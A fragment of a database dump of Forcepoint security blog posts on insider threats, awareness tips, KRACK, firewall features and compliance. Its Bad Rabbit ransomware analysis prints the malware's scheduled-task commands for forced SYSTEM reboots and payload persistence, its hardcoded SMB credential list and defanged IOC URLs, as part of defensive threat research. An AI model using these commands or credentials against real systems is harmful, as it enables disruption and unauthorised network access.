the Chinese takeout menu, plus a watering hole and a hijacked website. (A watering hole is a targeted compromise of a website in a supply chain. Cybercriminals or nation state hackers can reach a highly targeted group by injecting the site with malicious code, without sending out socially engineered lures, and lie in wait for victims to browse by and then infect them.)\n\n\n\n	Ultimately, this lunch provided a malicious actor (maybe a competitor) with all the formulas to the pharma company’s IP through a compromised insider. Maybe worse, the pharma company also shared data with other partners like a U.S. Government supplier and, in this worst case scenario, now our national security is compromised. Now let’s imagine the adversary doesn’t want to steal code, but alter it. The altered code is for a new vaccination specifically meant for troops stationed overseas. You get where I am going with this…“Not possible” you say? Are you sure? If we took a poll in any given company or agency and asked who has ordered General Tso’s Chicken online, how many would raise their hand? Mine is raised.\n\n\n\n	So, what to do? Let’s look at each of the above examples by order of intent and discuss security approaches and technologies that may have protected the user and data.\n\n\n\n	1. Accidental (i.e. Verizon): One person misconfigured one system, and 6 million records were exposed. That is unacceptable. So what else can be done?\n\n\n\n		DLP solutions such as Forcepoint\'s are not simply for blocking data from loss or leaks. They can enforce encryption or trigger other security measures. The level of risk to customers would be much lower if the data in the exposed Verizon repository had been encryped.\n	\n	\n		\"Coaching\" messages can also be triggered when users attempt to share or store data in unsecured or otherwise improper locations, even when they have the best intentions in mind. While controlling an immediate risk, this also helps improve awareness to proactively reduce future risks of data loss.\n	\n\n	Similarly, Deep Root Analytics had 200 million voter records leaked online due to employee error. Our CEO Matt Moynahan commented on the story.\n\n\n\n	In both cases, DLP enables the secure sharing of sensitive data with business partners throughout the supply chain.  \n\n\n\n	2. Compromised (i.e. Deloitte): As reported, Deloitte had client accounts leaked via a compromised admin account. This is a similar example to the Chinese food example above, and in this instance, it seems as though this data was also exfiltrated.\n\n\n\n	In the case of malware for lunch, an insider threat program and solution would have prevented Bob, the generous lunch provider, from infecting not only his own company but also the pharma partner or the U.S. government agency. Forcepoint Insider Threat can ensure proper information assurance controls are in place, such as up-to-date browsers, that would detect malicious java script often contained in watering holes and hijacked sites.\n\n\n\n	3. Malicious (i.e. Bupa): Bupa suffered a breach when one of its employees copied and removed sensitive customer information. Some sources have noted that this employee was disgruntled in some way, deliberately seeking to harm the company’s reputation.\n\n\n\n	If Forcepoint’s insider threat solution was in place the Bupa employee (and Dennis Nedry) would have been stopped long before malicious acts were executed. For example, Nedry was likely conspiring via email. Those emails would have immediately been flagged by Forcepoint Insider Threat, and Nedry would have been placed in an employee monitoring group. This would then be explored by a security team, where his intent would have been flagged as malicious before carrying out his damaging acts. This integration with email is important. The efficacy of insider threat programs and technologies multiplies when integrated with DLP and email, web and cloud security.  In this alternate world, maybe Nedry could have been rehabilitated and saved as a valuable employee).  Alternatively, let’s just say Nedry is too smart to use email, he still wrote code to shut security systems down. Forcepoint’s insider threat solution provides role definition and division that can prevent any one person sole ownership of sensitive code, ultimately stopped that aspect of his malicious actions.  \n\n\n\n	With regards to the Bupa employee, an insider threat program or UEBA solution would have flagged that sensitive information was being copied and removed – likely an anomalous behavior for a given employee. It could have been flagged and monitored, then encrypted to ensure it couldn’t be used outside of the network. Unfortunately, unlike fictional portrayals of good and evil, there is no simple resolution or silver bullet for security that can be tied up like in a movie’s conclusion. Our definition of the insider threat must go beyond the Dennis Nedrys of the world, or our reality will be like what we see in movies. The reality is that any good security program must be multi-faceted, intelligent, comprehensive, and most importantly human-centric. It must include policy, procedure, training and tech. In other words, your people have a huge role in securing data and livelihood.', 'https://www.forcepoint.com/blog/insights/high-profile-breaches-jurassic-park-and-chinese-takeout\n');

What Emergency?', 'Richard FordSean BergVinny SharmaForcepoint ', '\n      \n    \n      \n      \n   ', 'The last time I posted on this blog, I was writing about some warnings sent to companies regarding online risks – an entirely apropos topic as the USA’s National Cyber Security Awareness Month draws to a close. I’d like to expand a little bit on one of the threads in that last post, because while I think pushes such as ‘awareness’ are important, I am increasingly flummoxed by our overall expectations on what this awareness will do for us...but let me expand.\n\n\n\n	First, I should credit the source of the title of this post, which is shamelessly borrowed from Mark Neocleous’ book “Critique of Security.” While Mark’s book is far-reaching (and worth studying, though it is anything but a light read, and quite polarizing!), one chapter that I particularly enjoyed made me realize why I sometimes struggle a little with cyber warnings. Why? Because ‘emergency’ is very much the new normal – we just stumble from crisis to crisis. In such a world, given that the exception is no longer exceptional, treating it as such is pointless.\n\n\n\n	While the subject matter of Neocleous’ book is about security in its broader sense, many of the same concerns he raises can be applied to cyber security. The question then becomes, in a world that is always in crisis, how should we think about warnings, awareness, and response?\n\n\n\n	First, I would argue that recognizing the true state of play is critical, as without knowing where you are, it’s impossible to really know how to maneuver to get where you want to be. Coming to a realization that security operations are continuous, and that threats are never-ending, is step one in building up the right worldview. Awareness is a full time job.\n\n\n\n	Second, given that we’re in our current state of “emergency” it’s important to think about what we want our warnings to accomplish…warnings need to be actionable. Using this lens, letting defenders know about IoCs which can be searched for is actionable; warning in general terms about a targeted email attack in general is not. We’re already – and permanently – on high alert.\n\n\n\n	This neatly leads me to my third point: we need to be cognizant that it’s going to be difficult to raise awareness more than it already is. Humans are, above all else, human…that is, we’re emotional more than rational, and so getting your end users to change is capital-H Hard. Not impossible, but hard. When a user is trying to pay expenses, respond to an email, or close a sale, her mind is not on security but on the task at hand. That’s just part of being human. There are clever ways to help with this, but we’re not quite there yet. When you’re thinking about defenses, that’s a reality you have to accept.\n\n\n\n	So, what’s a CISO to do? Throwing one’s hands up in despair does not a solution make.\n\n\n\n	Personally, when I see October come and go, my response to National Cybersecurity Awareness Month is straightforward and simple. I pick one thing. Just one, usually one of the ‘basics’ that I think we’re not executing on as well as we should…and I make it my mission to nail it. Maybe for you, it’s a company-wide approach to patching. Maybe it’s the “development” workstations that you don’t monitor appropriately. Maybe it’s backups. Pick one thing, and fix it. If we can all take on a project like that, October will move us into a more secure place for 2018.', 'https://www.forcepoint.com/blog/insights/emergency-what-emergency\n');

An HTTP POST request is made to a URL hosting the content for a fake Adobe Flash update popup. Clicking on this downloads a dropper file which, when executed, performs the encryption and lateral-movement processes.\n\n\n\n\nFigure 2: The Bad Rabbit infection process flow\n\n\n\n\n\nTable 1: File signatures associated with Bad Rabbit\n\n\n\nNo privilege-escalation vulnerabilities are employed as part of this deployment process – the malware is reliant on people accepting the update file as legitimate and executing it with elevated permissions. To this end, the initial dropper attempts to mimic the legitimate Adobe Flash installation program.Note that dcrypt.sys appears to be a legitimate subcomponent of the open source DiskCryptor (http://diskcryptor.net) encryption solution as is in and of itself not malicious.\n\n\n\n\n Table 2: Comparison of legitimate and malicious/fake Adobe Flash installer metadata\n\n\nOnce installed, the malware targets a similar set of file extensions to those observed in the June NotPetya attack:\n\n\n.3ds .7z .accdb .ai .asm .asp .aspx .avhd .back .bak .bmp .brw .c .cab .cc .cer .cfg .conf .cpp .crt .cs .ctl .cxx .dbf .der .dib .disk .djvu .doc .docx .dwg .eml .fdb .gz .h .hdd .hpp .hxx .iso .java .jfif .jpe .jpeg .jpg .js .kdbx .key .mail .mdb .msg .nrg .odc .odf .odg .odi .odm .odp .ods .odt .ora .ost .ova .ovf .p12 .p7b .p7c .pdf .pem .pfx .php .pmf .png .ppt .pptx .ps1 .pst .pvi .py .pyc .pyw .qcow .qcow2 .rar .rb .rtf .scm .sln .sql .tar .tib .tif .tiff .vb .vbox .vbs .vcb .vdi .vfd .vhd .vhdx .vmc .vmdk .vmsd .vmtm .vmx .vsdx .vsv .work .xls .xlsx .xml .xvd .zip\n\nSimilar to the NotPetya outbreak in June 2017, Bad Rabbit attempts to spread laterally, post-infection via SMB. To achieve this, it scans for a number of network shares (Table 3, below) before attempting to spread using a combination of harvested credentials and hardcoded usernames and passwords (a complete listing of these is provided in Appendix B).\n\nNote that, unlike NotPetya, Bad Rabbit has not been observed attempting to self-propagate via an SMB exploit such as EternalBlue.\n\n\n\n\n\n Table 3: Network shares scanned by Bad Rabbit\n\n\nCuriously, for a piece of malware that calls itself Bad Rabbit on its own ransom page, the sample creates a number of tasks with a Game of Thrones theme - in this case named after the three dragons featured in the show:\n\n\ncmd.exe schtasks /Create /SC ONCE /TN drogon /RU SYSTEM /TR \"C:\\WINDOWS\\system32\\shutdown.exe /r /t 0 /f\" /ST 14:25:00\ncmd.exe schtasks /Create /SC ONCE /TN viserion /RU SYSTEM /TR \"C:\\WINDOWS\\system32\\shutdown.exe /r /t 0 /f\" /ST 14:29:00\ncmd.exe schtasks /Create /RU SYSTEM /SC ONSTART /TN rhaegal /TR \"C:\\WINDOWS\\system32\\cmd.exe /C Start \\\"\\\" \\\"C:\\Windows\\dispci.exe\\\" -id 1111111111 && exit\"\n\n\nThis apparent non-sequitur coupled with the slightly unusual selection of usernames hardcoded into the malware (e.g. \'alex\' and \'buh\') may point to either multiple developers, the re-use of open source code, or both.\n\nProtection Statement\n\nForcepoint customers are protected against this threat via Forcepoint Cloud Security, which includes the Advanced Classification Engine (ACE) as part of e-mail, web and NGFW security products. ACE (also known as Triton ACE) provides signature-less analytics to identify malicious intent, including evasion techniques to mask the malware.\n\nProtection is in place at the following stages of attack:\n\nStage 2 (Lure) - Malicious content associated with this attack are identified and blocked.\n\nStage 5 (Dropper File) - Bad Rabbit variants are prevented from being downloaded.\n\nStage 6 (Backchannel Traffic) - Attempts to spread via SMB are blocked by Forcepoint NGFW.\n\nObervations & Conclusion\n\nThe overlaps between Bad Rabbit and NotPetya potentially implicate the same actors in this latest attack. That said, if this is the case, a significant amount of work has gone into both the malware itself and the associated infrastructure over the past few months.\n\nNot least, in contrast with NotPetya, the use of unique payment wallets per victim potentially means that victims can recover their files by paying the ransom in this case and that the actors behind the campaign will likely profit from it. Unfortunately, this infrastructure also makes it difficult to comment on how many victims have chosen this course of action.\n\nOn the other hand, the switch to compromising victims via compromised websites may not be as significant a change as it appears on the surface, with the NotPetya actors having previously demonstrated their ability to compromise devices and use them to serve malware. While one should not draw conclusions from it, the parallel between NotPetya using an automated update server as a distribution method and Bad Rabbit using a fake Adobe Flash update installer is interesting.\n\nThe use of an open-source cryptographic module as part of this attack is unsurprising, with Forcepoint Security Labs previously having commented on the reuse of both malicious and legitimate code within malware (/security-labs/part-three-criminal-overground).\n\nOverall, though, perhaps most striking in this case is the ‘blunt instrument’ approach to running the malware on victim systems: NotPetya may have snuck onto user’s system by the back door, but Bad Rabbit needs an invitation (and potentially UAC approval as well).\n\nWhile it may seem an uphill struggle – and would not have helped in the case of NotPetya – user education is still critical in situations such as this: look closely at any prompts – especially those asking you to download software or ‘updates’ – and consider whether or not the prompt looks legitimate and whether or not it makes sense in context. If in doubt, visit the software vendor’s website yourself and check for the update there.\n\nMuch is made of the weakness of the human point, but in many cases – including this one – savvy users have the ability to break the infection chain.\n\nAppendix A - IOCs\n\nSHA1 File Hashes\n\n\nde5c8d858e6e41da715dca1c019df0bfb92d32c0\n79116fe99f2b421c52ef64097f0f39b815b20907\nafeee8b4acff87bc469a6f0364a81ae5d60a2add\n\nMalicious URLs\n\n\nhxxp://185.149.120[.]3/scholargoogle/\nhxxp://185.149.120[.]3/scholasgoogle/\nhxxp://1dnscontrol[.]com/flash_install.php\n\nAppendix B – Hardcoded SMB Credentials\n\nUsernames\n\n\nAdmin\nGuest\nUser\nUser1\nuser-1\nTest\nroot\nbuh\nboss\nftp\nrdp\nrdpuser\nrdpadmin\nmanager\nsupport\nwork\nother user\noperator\nbackup\nasus\nftpuser\nftpadmin\nnas\nnasuser\nnasadmin\nsuperuser\nnetguest\nalex\n\nPasswords\n\n\nAdministrator\nadministrator\nGuest\nguest\nUser\nuser\nAdmin\nadminTest\ntest\nroot\n123\n1234\n12345\n123456\n1234567\n12345678\n123456789\n1234567890\nAdministrator123\nadministrator123\nGuest123\nguest123\nUser123\nuser123\nAdmin123\nadmin123Test123\ntest123\npassword\n111111\n55555\n77777\n777\nqwe\nqwe123\nqwe321\nqwer\nqwert\nqwerty\nqwerty123\nzxc\nzxc123\nzxc321\nzxcv\nuiop\n123321\n321\nlove\nsecret\nsex\ngod', 'https://www.forcepoint.com/blog/security-labs/notnotpetya-bad-rabbit\n');

By collecting these messages and replaying them to a client, a malicious actor can exploit this behaviour to introduce enough known values into the system to attack the encryption protocol.\n\n\n\n	What does this mean?\n\n\n\n	In a practical sense, this may allow malicious actors to decrypt data being transmitted across wireless networks and, in certain cases, inject malicious data into existing streams, forge and inject packets, or recover encryption keys.\n\n\n\n	What devices are affected?\n\n\n\n	Almost all Wi-Fi client devices are reportedly affected, with certain operating systems (Android and Linux) and encryption protocols (WPA-TKIP and GCMP) more severely impacted.\n\n\n\n	How concerned should I be?\n\n\n\n	This is certainly a concerning discovery with far-reaching implications but there are mitigating factors: many applications such as online banking, accounting, or even Facebook and Google use HTTPS to provide an additional layer of encryption.\n\n\n\n	Attacks against HTTPS are not unheard of, but would require the presence of additional vulnerabilities and effort on the part of an attacker to break. However, if successful they would allow attackers to see sensitive messages being sent using this channel.\n\n\n\n	Protection Statement & Recommendations\n\n\n\n	Because the attacks focus on the 802.11 protocol, a standard which sits on the Physical and Data-Link levels of the OSI model, many devices are unable to protect against or detect the attack.\n\n\n\n	Owing to the way the attack works, AP devices – including Forcepoint NGFW devices with wireless capability – cannot be directly attacked with KRACK. However, this also means that the attack cannot be effectively mitigated by patching AP devices.\n\n\n\n	As such, it is critical that vendor patches are applied to all Wi-Fi client devices as soon as they are made available.', 'https://www.forcepoint.com/blog/security-labs/updated-krack-wpa2-wi-fi-recommendations\n');

Too often, the CIO tries to speak to stakeholders in technical terms, but security is everyone’s business. To reach everyone, you have to speak their language.\n\n\n\n	Consider making education around security experiential rather than compliance-based. The people within your organization need to understand, at an individual level, why security best practices matter to them, to their business, and to their customers and partners. For example, instead of teaching people what phishing is by way of a training module or slide deck, conduct a phishing experiment. When someone takes the bait, they immediately receive information on how to say safe, creating a much more powerful learning experience.\n\n\n\n	Always be Thinking of the Business\n\n\n\n	Be sure to have a strong architecture approach to security. These days, we’ve moved way beyond the era of “protect the end device and the perimeter.” Think through what your security program is going to comprise of in an era of BYOD, shadow IT, and Cloud applications. And while you’re looking at the big picture, consider the business implications of your security architecture (and be sure to communicate them clearly!).\n\n\n\n	Speaking of the business, never forget that you are part of a broader team, and that your shared mission is to support the business. From that perspective, it\'s up to you to shift security operations from the lens of “necessary evil” to “critical business infrastructure.” You would also do well to adjust the tone from “naysayer” to “enabler.” It’s important to develop a business culture that positions security as a force for good within the organization, so that employees are less likely to try to work around security protocols. This means understanding when, and why, members of your organization are circumventing security protocols, and partnering with them to find solutions that enable the business to grow stronger while still protecting critical assets.\n\n\n\n	And finally, it’s important to consider your external communications and relationships – because these have a significant impact on your business as well. Many recent breaches in the news have been remarkable in part because of the terrible external response. Speed matters, transparency matters, so reach out to customers in a matter of minutes and days not months and weeks. The faster you can react and contain the situation, the better you’ll protect the business.\n\n\n\n	A good plan today is better than a perfect plan tomorrow\n\n\n\n	Take a good look at your incident response plan. And if you don’t have one already, make that your first priority. Develop and socialize a documented policy and procedure that is shared across the organization, and make sure that your operating procedure maps to the document. Don’t let perfect be the enemy of good, here. It’s important to start somewhere, and build on your experience.\n\n\n\n	Unfortunately, no one among us is bulletproof, and security incidents will happen. While painful and costly, remember that these are also golden opportunities to review and make adjustments to your security infrastructure, your internal education, and your external communications.', 'https://www.forcepoint.com/blog/insights/rethinking-your-cybersecurity-approach-thoughts-cio\n');

Our Next Generation Firewall (NGFW) brings this approach into the network, providing the industry’s strongest security, smartest manageability, and highest availability for connecting and protecting users and the information they need.\n\n\n\n	Today we’re releasing a new version of the software – Forcepoint NGFW 6.3 – that powers our firewall, IPS, and other network security solutions. This new version provides more visibility into users’ actions and enforces security policies that are based on those actions. These same policies now can be used in Microsoft Azure on our virtual NGFW to protect apps and services running in the cloud. And, we’ve integrated key parts of our CASB technology to help in discovering cloud application usage and the relative levels of risk that each app entails.\n\n\n\n	Making Firewalls Aware of Users’ Actions within the Endpoint\n\n\n\n	Forcepoint NGFW 6.3 is now available for customers to download from our support portal and deploy in minutes via our Security Management Center. With it, our firewalls can now work with endpoint systems to continuously know:\n\n\n\n		Who is actually using the endpoint device,\n	\n	\n		What is the status of operating system and key security services, and\n	\n	\n		Which specific programs are being run on the endpoint to access the network.\n	\n\n	Having this information in one place simplifies the admin’s job, but the real power comes from making security policies more user-aware. While most firewalls can do things like “allow the Social Media Group to connect to Facebook, but block everyone else,” Forcepoint NGFW is taking it several steps further.\n\n\n\n	We can reliably know about local users, not just domain logins. We can enforce NAC-style requirements (“AV must be on and up-to-date”) for access. And, we can do whitelisting and blacklisting of specific endpoint applications (“block use of IE 7-10 but allow IE 11” or “block all programs except for POSAPP.EXE on these point-of-sale systems”) without the need for separate products. And of course they can be combined so that controls can be more closely tailored to the business processes they are meant to express.\n\n\n\n	\n\n\n	Controlling Access by Endpoint Application and Version\n\n\n\n	Extending Protection into Microsoft Azure and Hyper-V\n\n\n\n	Today’s hybrid enterprise consumes and produces applications from the cloud as well as internally. Securing access to all of these applications consistently, without introducing gaps or silos, is crucial to preventing breaches and keeping costs from spiraling out of control.\n\n\n\n	Forcepoint customers can now use our virtual NGFW to protect applications running in Microsoft Azure in the public cloud or on Hyper-V-based private cloud systems with the same policies, dashboards, and reports as the rest of their network. Whether you’re controlling in/out access, connecting apps running in Azure to databases running in Amazon Web Services, or protecting a microsegmented software-defined network with the latest in IPS technology, Forcepoint NGFW gives you the full security and manageability that our firewalls are known for.\n\n\n\n	CASB-style Cloud Application Discovery\n\n\n\n	Our NGFW is part of the broader Forcepoint Human Point System. With Forcepoint NGFW 6.3, we’ve adapted part of the technology from our Cloud Application Security Broker (CASB) to use our firewall’s existing log data to discover which cloud apps are being used by each user – and what level of risk each app might pose. This can give admins quick insight into their network’s risk profile and provides a first step toward complementing their NGFW with the added protection offered by our CASB.\n\n\n\n	\n\n\n	 \n\n\n\n	Cloud Application Discovery Report \n\n\n\n	NGFW 6.3 Adds Other Enhancements\n\n\n\n	The NGFW 6.3 release also extends Forcepoint’s firewall and IPS capabilities in other ways:\n\n\n\n		Expanded Sidewinder Proxy Protection for Mission-Critical Apps – Forcepoint NGFW now includes the ability to protect HTTP/HTTPS applications as well as SSH, FTP/SFTP, TFTP and DNS services.\n	\n	\n		L2/L3 Mixed-Mode Deployment – With 6.3, you can use one Forcepoint NGFW appliance in two ways, simultaneously, to save time, money and effort. One set of interfaces can be inspecting LAN traffic with our industry-leading IPS while others are being protected with firewalling.\n	\n	\n		Additional Flexibility for Managing Approvals – SMC users can now be granted permission to approve Pending Changes, simplifying 2-person change management processes.\n	\n	\n		Route-based VPN – MSSPs and others will appreciate being able to set up route-based VPNs within domains.\n	\n	\n		More than a dozen display and administrative enhancements – IT personnel can even more efficiently see what is happening across their VPNs, log servers, management consoles and even 3rd party devices through numerous automation and user experience improvements in the SMC.\n	\n\n	You can learn more about our NGFW software, what customers are saying about it, and what makes it different here.', 'https://www.forcepoint.com/blog/insights/making-network-security-more-human-aware-office-edge-cloud\n');
INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (48, '6 Areas to Think About for Staying Safe Online', 'Carl LeonardSean BergVinny SharmaForcepoint ', '\n      \n    \n      \n      \n   ', 'October is National Cybersecurity Awareness Month. This is a great opportunity each year to take a look at your online practices around personal data, password management, and overall awareness. Raising your own awareness of cyber threats can help prevent you from becoming a compromised end-user. No one is perfect, and mistakes will still happen, but it’s up to all of us to do our best to safeguard data – for ourselves, our employers, and anyone whose information we interact with. Read on to review some areas to think about – and concrete actions you can take to protect yourself.\n\n\n\n	1. Don\'t be phooled by phishing scams\n\n\n\n	Traditional phishing methods have changed. Attackers have moved on from hosting suspicious looking spoofed bank websites. Banking Trojans can be silently installed on your machine after browsing to infected websites or opening suspicious documents attached to emails so it is wise to take heed of warnings from your bank and monitor your accounts closely.\n\n\n\n	Social engineering is a technique used by attackers to influence your behaviour. They can better do this when they know a lot about you. These days it’s common practice to have personal information about yourself available on the Internet. LinkedIn, for example, has 500 million users. Chances are you’re one of them, and your work history and education are viewable to anyone who cares to research you. Millions of people have public-facing Instagram accounts that provide even more insight into someone’s family life, favourite places to visit, and hobbies. It’s important to understand that when you make this kind of information publicly available, you also make yourself vulnerable to social engineering. If an email or direct message from a friend feels “off,” proceed with caution, especially if they’re trying to get you to click on a strange link or share personal or financial information.\n\n\n\n	Action Plan:\n\n\n\n		Review your social media privacy settings\n	\n	\n		Trust your gut – if a message feels “off” it could be a spear phishing attempt\n	\n	\n		Pay close attention to the link – many malicious websites are off by a single letter or by the top-level domain (for example, .net instead of .com)\n	\n\n	2. Lock down your devices\n\n\n\n	Protect your cell phone, tablet, and computer. Your cell phone, in particular, is a powerful computer that is easily compromised or lost; more importantly your cell phone is the route into your private life and business dealings. Take advantage of the screen lock and passcode options on your devices, and use only trusted apps. Always update to the most recent operating system, and keep your software updated as well, as these frequently contain security upgrades. Consider implementing GPS tracking (either via apps/OS or a tracker) on your mobile devices, and learn how to remotely disable your device in the event of loss or theft. Finally, if you frequently use your laptop in a public setting, be sure to install a screen guard to prevent in-person spying.\n\n\n\n	Action Plan:\n\n\n\n		Upgrade to the latest operating system and software versions offered on your phone, tablet, and PC\n	\n	\n		Learn how to remotely disable your devices\n	\n	\n		Install a screen guard on your laptop\n	\n\n	3. Get real about password management\n\n\n\n	When passwords are reused, attackers who obtain your username and password from one data breach can easily use that to access many more aspects of your online life. A password vault is a great way to avoid reusing passwords across services. By using a vault, which syncs across devices, you can create much stronger safeguards against would-be attackers. Additionally, use Two Factor Authentication (2FA) where possible. Most popular with online banking, but now seen on a variety of social media platforms and elsewhere, 2FA helps prevent unauthorised access to your accounts as an attacker will not have that second piece of information required to login. It is also worthwhile setting up the facility for One Time Passcodes (OTP) if available, especially for approving financial transactions when online banking. Consider password protecting important documents and certainly perform regular backups for peace of mind in the case of a ransomware attack or hardware failure.\n\n\n\n	Action Plan\n\n\n\n		Use a password vault\n	\n	\n		Use 2FA whenever it is available\n	\n	\n		Perform regular backups – to a hard drive or to the cloud\n	\n\n	4. Stay on top of leaks and breaches, and be mindful of who has your PII\n\n\n\n	Take heed of data breach notifications that you hear of in the press and from your breached provider. Understand what was leaked and assess the risk to yourself. If you are concerned about financial impact ask your bank to set up alerts on your account and credit records.\n\n\n\n	Data aggregators such as credit reporting agencies and government departments continue to be hacked. Email providers are being attacked or suffer data loss. Attackers have a treasure trove of stolen personally identifiable information (PII) at their fingerprints; some of which you cannot change such as your Social Security Number or National Identification number. Be aware that if this type of information gets in the hands of attackers it could lead to identity theft so protect your PII as best as you can.\n\n\n\n	Action Plan\n\n\n\n		Make a list of those organizations who have your PII\n	\n	\n		Stay on top of the news whenever there is a breach\n	\n	\n		Set up alerts on your account and credit reports\n	\n\n	5. Protect yourself at home AND at work\n\n\n\n	Remember that you’re responsible for more than just your personal data. Think about the ways you interact with sensitive data at work – and be sure to follow the data handling policies that have been set up within your business. Treat work-related data with as much care as you would your own. Most businesses have policies in place around data handling as well as response plans for breaches. Take the time to review those policies so you are prepared for how to respond if you identify an issue or see a dreaded ransomware demand message. Your employer will thank you for being their eyes and ears given today’s threat landscape.\n\n\n\n	Action Plan\n\n\n\n		Treat work data as sensitively – if not more so – as your own personal data\n	\n	\n		Review your business’s data handling and breach response policies\n	\n	\n		Speak up if you have any concerns or questions about data handling at work\n	\n\n	6. We\'re all in this together - don\'t be afraid to ask for help\n\n\n\n	Reach out for help – whether to a computer-literate family member if at home or your employer’s IT team. Take care of your data, take care of your employer’s data and adjust your behaviour to suit the current cyber security landscape. Stay Safe Online, the organization behind National Cybersecurity Awareness Month, is a great place to start if you’re looking for resources.\n\n\n\n	Action Plan\n\n\n\n		Review the Stay Safe Online safety tips – and share them with a friend or family member\n	\n	\n		Set up a quarterly calendar reminder to review all of your online privacy and security practices\n	\n	\n		Trust your inner voice – if an email or message feels off, pay attention to that feeling and proceed with caution!', 'https://www.forcepoint.com/blog/insights/6-areas-think-about-staying-safe-online\n');

While experienced security professionals know there is always a new threat coming, ransomware challenges enterprise networks in new ways – from human points of failure to the layering of security and mitigation software. \n\n\n\n	Cybersecurity shifted to the physical realm earlier this year with its effects felt in life-and-death situations. WannaCry left patients stranded in Jakarta when a hospital couldn’t access their medical records and severly disrupted the UK’s National Health Service. Another global attack, Petya/NotPetya, shut down the radiation monitoring systems of the Chernobyl nuclear power plant in Ukraine and forced Maersk, a major global shipping company, to revert to an alternate processes causing significant delays. Indiscriminate in its targets, the attacks also disrupted a range of industries and halted everything from assembly lines and global shipments to important government services.\n\n\n\n	It is clear from these examples that sophisticated hackers­ ­are increasing the number of cyberattacks on commercial companies and private institutions. By targeting commercial networks, attackers threaten the critical services we rely on and our underlying stability, creating the potential for a global security crisis. We know that many CISOs are tired of hearing vendors say “our solution would have protected you,” when in fact the situation is far more complex. As we’ve learned from WannaCry and Petya/NotPetya, these crises often arise out of a well-known challenge: timely patch management (or the lack thereof). Understanding the combination of technology and process issues is key to understanding how to safeguard organizations.\n\n\n\n	With more than 85 percent of the networks, devices, and infrastructure of the internet in commercial hands, the future of the internet is dependent on commercial companies elevating their security and resiliency. The recent global cyberattacks exemplify a new dimension of global security – one that puts the commercial and private sectors on the front lines. Simply put, these attacks are a wake-up call. We have entered a new era when business leaders must evaluate their companies’ exposure to risk through a broader security lens, something that doesn’t always come naturally to CEOs and corporate boards.\n\n\n\n	From our vantage point, the commercial sector is still significantly underprepared. Few boards fully understand their exposure to cyber risk despite the growing attack surface area and vulnerabilities in today’s organizational environment. Besides accidental or malicious insiders, the modern business network exposes organizations to a variety of threats, be it compromised partners in the network, unsecured Internet of Things devices, shadow IT, or the growing trend of BYOD. For more on how commercial boards can better prepare against security threats, I invite you to read this article from our CEO, Matthew Moynahan, and CEO of Raytheon Tom Kennedy.', 'https://www.forcepoint.com/blog/insights/thoughts-govware-2017-lessons-learned-ransomware-outbreaks\n');

So it’s not surprising that according to estimates by the SANS Institute up to 80 percent of all cyber breaches may have originated in the supply chain.\n\n\n\n	And, of particular concern for the government supply chain, are the most damaging threats to critical IP and systems that can adversely impact government missions, including; counterfeit parts, espionage through compromised devices, reverse engineering, intellectual property theft, and denial of service attacks.\n\n\n\n	Securing the global supply chain, while ensuring its smooth functioning, is essential to our national security as well as domestic and international economies. As an important step in addressing this critical need, 109 new cybersecurity technology and security policy requirements have been established through the Defense Federal Acquisition Regulation Supplement (DFARS) NIST SP 800-171 supply chain program that address managing and protecting defense and controlled unclassified information (CUI) through standardization of security technology and procedures. Department of Defense (DoD) suppliers have until December 31, 2017 to become compliant with these requirements or risk losing current and future contract awards with the government.\n\n\n\n	With the deadline fast approaching, many organizations within the DoD supply chain are racing to find solutions to the 53 technology and 56 policy based requirements. Many businesses are struggling, especially small and medium sized organizations, with a lack of resources to address NIST SP 800-171 on their own.\n\n\n\n	A 2016 report from the National Cybersecurity Alliance found that 59 percent of small and medium businesses interviewed don’t have a contingency plan in place for reporting and responding to breaches. And, the U.S. Small Business Administration reported for FY2017 the DoD targeted small businesses as 34 percent of the overall subcontractor awards goal. This number can easily represent hundreds, or even thousands, of critical DoD suppliers that deliver essential software and systems that support warfighters in theater.\n\n\n\n	Forcepoint Is Simplifying the Path to Compliance\n\n\n\n	To help suppliers address the need for compliance before the year-end deadline, Forcepoint has partnered with security industry leaders to deliver an all-encompassing NIST SP 800-171 solution path.\n\n\n\n	Forcepoint’s NIST SP 800-171 solution offers government contractors of any size a pre-configured package of hardware and software tools that enable businesses to quickly deploy a secure platform specifically designed to address the technology controls defined by NIST.

Despite a focus on detecting malware threats and meeting compliance demands, enterprises have actually done little to reduce the risk of data loss. Forcepoint believes data protection starts and ends with your people. Guide users to make smart decisions with data. Understand how your people interact with your valuable data and analyze that behavior for risk. See how user-focused data protection creates a partnership between the enterprise and its people to protect data.\n\n\n\n	Why User and Entity Behavior Analytics is essential for the Cloud\n	As businesses move to the Cloud, the security challenge evolves. Employees are changing the way they access data and the devices they use. UEBA is an essential tool for rapidly analyzing and responding to ever-growing risks in this environment.  Come and learn about Advanced UEBA and how it is the principal defense if you have embraced the Cloud.\n\n\n\n	The Networking Industry’s Dirty Secret: Why Are Evasions Still a Thing?\n	Firewalls exist to keep attackers and malware out. But hackers have been bypassing even the latest NGFWs and IPSs using Advanced Evasion Techniques (AET) for years.  Forcepoint released Evader, an evasion test lab, years ago to help the industry fix the problem. But has it? Evader’s back so that you can test for yourself and see how even the biggest names in network security still leave you exposed.\n\n\n\n	WannaCry’s Trajectory and Preparing for Tomorrow’s Ransomware\n\n\n\n	20 September 2017\n\n\n\n	15:50 – 16:30\n\n\n\n	Venue: MR 310-311, Level 3\n\n\n\n	 \n\n\n\n	The global WannaCry ransomware outbreak is just one of an increasingly frequent series of threats; experienced security professionals know there is always a new threat coming.

Read part one ‘Security, Performance, Obfuscation & Compression’ here and part two ‘Camouflage .NETting’ here.\n\nMuch attention is paid to the underground economy in the media with a huge focus on the availability of malware on underground and so-called ‘darknet’ forums. These underground services may make a more exciting story, but the recurring theme throughout the past two posts in this series has been the ready availability of commercial tools written without malicious intent which can nonetheless be turned to ill purposes.\n\nInstead of relying on underground sources to provide the payload then simply obfuscating and deploying it using publicly available tools, the reality is that an individual with malicious intent could assemble an effective campaign from ‘off-the-shelf’ products available quite openly on the Internet.\n\nThe question is, how much skill is required?\n\nThe good, the bad & the ugly\n\nWhile the focus was on their potential applications as part of malicious campaigns, the vast majority of the tools discussed in this series have had legitimate commercial applications, usually for the protection of intellectual property. As an example, the developers of Eazfuscator, a commercially available .NET obfuscation tool, list major organisations including Samsung, Oracle, and Ford amongst their customers.\n\nOf course, there are a number of other tools out there for which the intended legitimate uses can be hard to divine. Agent Tesla, for example, describes itself simply as ‘software for monitoring your personel [sic] computer’ yet this rather feels (for those of us old enough to remember, at least) like Back Orifice’s ostensible primary purpose as a Windows administration tool: there are a number of 